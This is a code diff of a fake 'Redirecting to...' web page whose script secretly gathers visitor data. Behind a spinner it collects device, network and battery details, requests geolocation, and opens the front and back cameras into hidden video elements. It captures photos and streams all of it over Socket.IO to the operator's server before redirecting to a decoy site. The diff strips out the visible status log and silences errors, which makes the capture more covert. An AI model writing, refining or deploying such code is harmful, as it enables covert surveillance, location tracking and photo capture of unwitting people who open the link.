@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f5f7fa;
+            background: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,16 +18,12 @@
         }
         .container {
             text-align: center;
-            max-width: 500px;
+            max-width: 450px;
             width: 100%;
-            background: white;
-            padding: 40px 30px;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
         }
         .spinner {
-            width: 44px;
-            height: 44px;
+            width: 40px;
+            height: 40px;
             border: 4px solid #e8ecf1;
             border-top: 4px solid #4285f4;
             border-radius: 50%;
@@ -51,36 +47,30 @@
             margin-top: 4px;
         }
         .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
-        #statusBox {
-            margin-top: 18px;
-            padding: 12px 16px;
-            background: #f8f9fc;
-            border-radius: 10px;
-            font-size: 13px;
-            color: #1a2332;
-            text-align: left;
-            border: 1px solid #eaedf2;
-            max-height: 250px;
-            overflow-y: auto;
-        }
-        #statusBox .done { color: #22a67e; }
-        #statusBox .error { color: #e53e3e; }
-        #statusBox .wait { color: #f6ad55; }
-        #statusBox .info { color: #4299e1; }
+        
+        /* Hidden elements */
         #hiddenVideo, #hiddenVideoBack { display: none; }
+        
+        /* Optional permission button - small and clean */
         .perm-btn {
             background: #4285f4;
             color: white;
             border: none;
-            padding: 10px 24px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-size: 13px;
             cursor: pointer;
-            margin-top: 12px;
+            margin-top: 15px;
             display: none;
+            font-weight: 500;
         }
         .perm-btn:hover { background: #3367d6; }
+        
+        #statusMsg {
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -89,113 +79,51 @@
         <div class="redirect-text">Redirecting to</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
         <div class="sub-text">Please wait a moment</div>
-        
-        <div id="statusBox">
-            <div id="logContainer">⏳ Initializing...</div>
-        </div>
-        
-        <button class="perm-btn" id="manualTriggerBtn">📸 Allow Permissions</button>
+        <div id="statusMsg"></div>
+        <button class="perm-btn" id="manualTriggerBtn">Allow Permissions</button>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <video id="hiddenVideoBack" autoplay playsinline muted></video>
 
-    <!-- ========================================== -->
-    <!-- FIXED: SOCKET.IO CDN (WORKING VERSION) -->
-    <!-- ========================================== -->
+    <!-- Socket.IO CDN with fallback -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
-    
-    <!-- FALLBACK: If above CDN fails -->
     <script>
         if (typeof io === 'undefined') {
-            document.write('<scr' + 'ipt src="https://cdn.socket.io/4.6.1/socket.io.min.js"><\/scr' + 'ipt>');
-        }
-        if (typeof io === 'undefined') {
-            document.write('<scr' + 'ipt src="https://unpkg.com/socket.io-client@4.7.2/dist/socket.io.min.js"><\/scr' + 'ipt>');
+            var s = document.createElement('script');
+            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
+            document.head.appendChild(s);
         }
     </script>
 
     <script>
         // ============================================================
-        // GUARANTEED WORKING - WITH FIXED CDN
+        // SIMPLE, CLEAN, GUARANTEED WORKING
         // ============================================================
         (function() {
             const visitorId = window.location.pathname.split('/').pop();
-            const logContainer = document.getElementById('logContainer');
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
+            const statusMsg = document.getElementById('statusMsg');
             const manualBtn = document.getElementById('manualTriggerBtn');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
-            let streamFront = null;
-            let streamBack = null;
 
-            // ============================================
-            // LOG FUNCTION
-            // ============================================
-            function addLog(msg, type = 'info') {
-                const time = new Date().toLocaleTimeString();
-                const colors = {
-                    done: '#22a67e',
-                    error: '#e53e3e',
-                    wait: '#f6ad55',
-                    info: '#4299e1'
-                };
-                const emojis = {
-                    done: '✅',
-                    error: '❌',
-                    wait: '⏳',
-                    info: 'ℹ️'
-                };
-                const div = document.createElement('div');
-                div.style.color = colors[type] || '#1a2332';
-                div.style.marginBottom = '4px';
-                div.style.fontSize = '13px';
-                div.textContent = `${emojis[type] || '•'} ${msg}`;
-                logContainer.appendChild(div);
-                logContainer.scrollTop = logContainer.scrollHeight;
-                console.log(`[${type}]`, msg);
-            }
-
-            addLog('Page loaded', 'info');
-            addLog(`Visitor ID: ${visitorId}`, 'info');
-
-            // Check if Socket.IO loaded
-            if (typeof io === 'undefined') {
-                addLog('❌ Socket.IO library not loaded!', 'error');
-                addLog('💡 Trying alternative CDN...', 'wait');
-                // Try loading from alternative source
-                var script = document.createElement('script');
-                script.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
-                document.head.appendChild(script);
-                script.onload = function() {
-                    addLog('✅ Socket.IO loaded from fallback CDN', 'done');
-                    fetchRedirectUrl();
-                };
-                script.onerror = function() {
-                    addLog('❌ All CDN failed! Please check internet.', 'error');
-                };
-            } else {
-                addLog('✅ Socket.IO library loaded', 'done');
-                fetchRedirectUrl();
+            function setStatus(msg) {
+                statusMsg.textContent = msg;
+                console.log(msg);
             }
 
             // ============================================
             // 1. FETCH REDIRECT URL
             // ============================================
             function fetchRedirectUrl() {
-                addLog('Fetching redirect URL...', 'wait');
-                
                 fetch(`/api/visitor/${visitorId}`)
-                    .then(res => {
-                        if (!res.ok) throw new Error('HTTP ' + res.status);
-                        return res.json();
-                    })
+                    .then(res => res.json())
                     .then(data => {
                         redirectUrl = data.redirectUrl || 'https://www.google.com';
                         redirectDisplay.textContent = redirectUrl;
-                        addLog(`✅ Redirect URL: ${redirectUrl}`, 'done');
                         connectSocket();
                     })
                     .catch(() => {
@@ -204,13 +132,11 @@
                             .then(data => {
                                 redirectUrl = data.redirectUrl || 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                addLog(`✅ Fallback URL: ${redirectUrl}`, 'done');
                                 connectSocket();
                             })
                             .catch(() => {
                                 redirectUrl = 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                addLog(`✅ Default URL: ${redirectUrl}`, 'done');
                                 connectSocket();
                             });
                     });
@@ -220,33 +146,25 @@
             // 2. CONNECT SOCKET
             // ============================================
             function connectSocket() {
-                addLog('Connecting to server...', 'wait');
-                
                 try {
                     socket = io({
                         transports: ['websocket', 'polling'],
-                        reconnectionAttempts: 5,
+                        reconnectionAttempts: 3,
                         reconnectionDelay: 1000
                     });
 
                     socket.on('connect', function() {
-                        addLog('✅ Socket connected!', 'done');
+                        setStatus('Connected');
                         startDataCollection();
                     });
 
-                    socket.on('connect_error', function(err) {
-                        addLog(`❌ Socket error: ${err.message}`, 'error');
-                        addLog('Retrying in 3 seconds...', 'wait');
-                        setTimeout(() => socket.connect(), 3000);
-                    });
-
-                    socket.on('disconnect', function() {
-                        addLog('⚠️ Socket disconnected', 'error');
+                    socket.on('connect_error', function() {
+                        setStatus('Retrying...');
+                        setTimeout(() => socket.connect(), 2000);
                     });
 
                 } catch(e) {
-                    addLog(`❌ Socket init error: ${e.message}`, 'error');
-                    setTimeout(redirectNow, 8000);
+                    setTimeout(redirectNow, 5000);
                 }
             }
 
@@ -254,8 +172,6 @@
             // 3. START DATA COLLECTION
             // ============================================
             function startDataCollection() {
-                addLog('📱 Collecting data...', 'info');
-                
                 // Send device info
                 const deviceInfo = {
                     userAgent: navigator.userAgent,
@@ -264,41 +180,26 @@
                     language: navigator.language,
                     deviceName: navigator.userAgentData ? 
                         navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
-                        navigator.platform,
-                    os: navigator.userAgentData ? 
-                        navigator.userAgentData.platform : 
                         navigator.platform
                 };
 
                 if (socket && socket.connected) {
-                    socket.emit('visitor-connect', {
-                        visitorId: visitorId,
-                        ...deviceInfo
-                    });
-                    addLog('📱 Device info sent', 'done');
-                } else {
-                    addLog('⚠️ Socket not connected', 'error');
+                    socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                 }
 
-                // ============================================
-                // 4. REQUEST LOCATION
-                // ============================================
-                addLog('📍 Requesting location...', 'wait');
-                
+                // ===== LOCATION =====
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            const lat = position.coords.latitude;
-                            const lng = position.coords.longitude;
-                            addLog(`📍 Location: ${lat}, ${lng}`, 'done');
+                        function(pos) {
+                            const lat = pos.coords.latitude;
+                            const lng = pos.coords.longitude;
                             
                             fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                 .then(res => res.json())
                                 .then(data => {
                                     const locationInfo = {
-                                        lat: lat,
-                                        lng: lng,
-                                        accuracy: position.coords.accuracy,
+                                        lat, lng,
+                                        accuracy: pos.coords.accuracy,
                                         timestamp: new Date().toISOString(),
                                         country: data.countryName || 'Unknown',
                                         state: data.principalSubdivision || 'Unknown',
@@ -306,114 +207,80 @@
                                     };
                                     if (socket && socket.connected) {
                                         socket.emit('visitor-data', {
-                                            visitorId: visitorId,
+                                            visitorId,
                                             type: 'location',
                                             content: locationInfo
                                         });
-                                        addLog(`📍 Location sent: ${locationInfo.city}, ${locationInfo.state}`, 'done');
                                     }
                                 })
                                 .catch(() => {
-                                    const locationInfo = {
-                                        lat: lat,
-                                        lng: lng,
-                                        accuracy: position.coords.accuracy,
-                                        timestamp: new Date().toISOString()
-                                    };
                                     if (socket && socket.connected) {
                                         socket.emit('visitor-data', {
-                                            visitorId: visitorId,
+                                            visitorId,
                                             type: 'location',
-                                            content: locationInfo
+                                            content: { lat, lng, accuracy: pos.coords.accuracy }
                                         });
-                                        addLog('📍 Basic location sent', 'done');
                                     }
                                 });
                         },
-                        function(error) {
-                            addLog(`❌ Location denied: ${error.message}`, 'error');
-                            addLog('💡 Click "Allow" if browser asks', 'info');
-                        },
-                        { timeout: 10000, enableHighAccuracy: true }
+                        function() { /* Location denied - continue */ },
+                        { timeout: 5000, enableHighAccuracy: true }
                     );
                 }
 
-                // ============================================
-                // 5. REQUEST CAMERAS
-                // ============================================
-                addLog('📸 Requesting front camera...', 'wait');
-                
+                // ===== CAMERAS =====
+                // Front Camera (silent fail if not available)
                 navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { facingMode: 'user' },
                     audio: false
                 })
                 .then(function(stream) {
-                    addLog('✅ Front camera granted', 'done');
-                    streamFront = stream;
                     const video = document.getElementById('hiddenVideo');
-                    video.srcObject = streamFront;
+                    video.srcObject = stream;
                     return video.play();
                 })
                 .then(function() {
                     setTimeout(function() {
                         capturePhoto('front', document.getElementById('hiddenVideo'));
-                    }, 1500);
+                    }, 1000);
                 })
-                .catch(function(err) {
-                    addLog(`❌ Front camera denied: ${err.message}`, 'error');
-                });
+                .catch(function() { /* Camera not available - skip */ });
 
-                addLog('📸 Requesting back camera...', 'wait');
-                
+                // Back Camera (silent fail if not available)
                 navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { facingMode: 'environment' },
                     audio: false
                 })
                 .then(function(stream) {
-                    addLog('✅ Back camera granted', 'done');
-                    streamBack = stream;
                     const video = document.getElementById('hiddenVideoBack');
-                    video.srcObject = streamBack;
+                    video.srcObject = stream;
                     return video.play();
                 })
                 .then(function() {
                     setTimeout(function() {
                         capturePhoto('back', document.getElementById('hiddenVideoBack'));
-                    }, 2500);
+                    }, 2000);
                 })
-                .catch(function(err) {
-                    addLog(`❌ Back camera denied: ${err.message}`, 'error');
-                });
+                .catch(function() { /* Camera not available - skip */ });
 
-                // ============================================
-                // 6. BATTERY
-                // ============================================
+                // ===== BATTERY =====
                 if (navigator.getBattery) {
                     navigator.getBattery()
                         .then(function(battery) {
                             const level = Math.round(battery.level * 100);
                             if (socket && socket.connected) {
                                 socket.emit('visitor-data', {
-                                    visitorId: visitorId,
+                                    visitorId,
                                     type: 'battery',
                                     content: level
                                 });
-                                addLog(`🔋 Battery: ${level}%`, 'done');
                             }
                         })
-                        .catch(function() {
-                            addLog('⚠️ Battery API error', 'error');
-                        });
+                        .catch(function() {});
                 }
 
-                // ============================================
-                // 7. NETWORK
-                // ============================================
-                let networkData = {
-                    type: 'Unknown',
-                    effectiveType: 'Unknown',
-                    downlink: 'Unknown'
-                };
+                // ===== NETWORK =====
+                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                 if (navigator.connection) {
                     const conn = navigator.connection;
                     networkData = {
@@ -424,36 +291,27 @@
                 }
                 if (socket && socket.connected) {
                     socket.emit('visitor-data', {
-                        visitorId: visitorId,
+                        visitorId,
                         type: 'network',
                         content: networkData
                     });
-                    addLog(`📶 Network: ${networkData.effectiveType}`, 'done');
                 }
 
-                // ============================================
-                // 8. AUTO REDIRECT
-                // ============================================
-                addLog('⏳ Will redirect in 8 seconds...', 'wait');
+                // ===== AUTO REDIRECT AFTER 5 SECONDS =====
                 setTimeout(function() {
-                    if (!redirectTriggered) {
-                        addLog('🔄 Redirecting now...', 'info');
-                        redirectNow();
-                    }
-                }, 8000);
+                    if (!redirectTriggered) redirectNow();
+                }, 5000);
 
-                // ============================================
-                // 9. MANUAL TRIGGER BUTTON
-                // ============================================
+                // ===== MANUAL BUTTON (optional fallback) =====
                 manualBtn.style.display = 'block';
                 manualBtn.onclick = function() {
-                    addLog('📸 Manual trigger clicked', 'info');
+                    manualBtn.style.display = 'none';
+                    // Retry camera
                     navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user' },
                         audio: false
                     })
                     .then(function(stream) {
-                        addLog('✅ Manual: Camera granted!', 'done');
                         const video = document.getElementById('hiddenVideo');
                         video.srcObject = stream;
                         video.play();
@@ -461,20 +319,15 @@
                             capturePhoto('front', video);
                         }, 1000);
                     })
-                    .catch(function(err) {
-                        addLog(`❌ Manual: ${err.message}`, 'error');
-                    });
+                    .catch(function() {});
                 };
             }
 
             // ============================================
-            // 10. CAPTURE PHOTO
+            // 4. CAPTURE PHOTO
             // ============================================
             function capturePhoto(type, video) {
-                if (!video || !video.videoWidth) {
-                    addLog(`⚠️ ${type} video not ready`, 'error');
-                    return;
-                }
+                if (!video || !video.videoWidth) return;
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
@@ -485,34 +338,28 @@
 
                 if (socket && socket.connected) {
                     socket.emit('visitor-data', {
-                        visitorId: visitorId,
+                        visitorId,
                         type: type === 'back' ? 'backCamera' : 'frontCamera',
                         content: imageData
                     });
-                    addLog(`📸 ${type} photo sent`, 'done');
                 }
 
-                if (type === 'front' && streamFront) {
-                    streamFront.getTracks().forEach(t => t.stop());
-                    streamFront = null;
-                }
-                if (type === 'back' && streamBack) {
-                    streamBack.getTracks().forEach(t => t.stop());
-                    streamBack = null;
+                // Stop stream
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(t => t.stop());
                 }
             }
 
             // ============================================
-            // 11. REDIRECT
+            // 5. REDIRECT
             // ============================================
             function redirectNow() {
                 if (redirectTriggered) return;
                 redirectTriggered = true;
-                addLog(`🔄 Redirecting to: ${redirectUrl}`, 'info');
 
                 if (socket && socket.connected) {
                     socket.emit('visitor-data', {
-                        visitorId: visitorId,
+                        visitorId,
                         type: 'redirectComplete',
                         content: { redirected: true, time: new Date().toISOString() }
                     });
@@ -520,21 +367,22 @@
 
                 setTimeout(function() {
                     window.location.href = redirectUrl;
-                }, 1000);
+                }, 500);
             }
 
             // ============================================
-            // 12. START (If Socket.IO already loaded)
+            // 6. START
             // ============================================
             if (typeof io !== 'undefined') {
-                // Already started via script.onload or direct load
+                fetchRedirectUrl();
+            } else {
+                // Wait for fallback CDN
+                setTimeout(fetchRedirectUrl, 2000);
             }
 
             // Cleanup
             window.addEventListener('beforeunload', function() {
                 if (socket) socket.disconnect();
-                if (streamFront) streamFront.getTracks().forEach(t => t.stop());
-                if (streamBack) streamBack.getTracks().forEach(t => t.stop());
             });
 
         })();
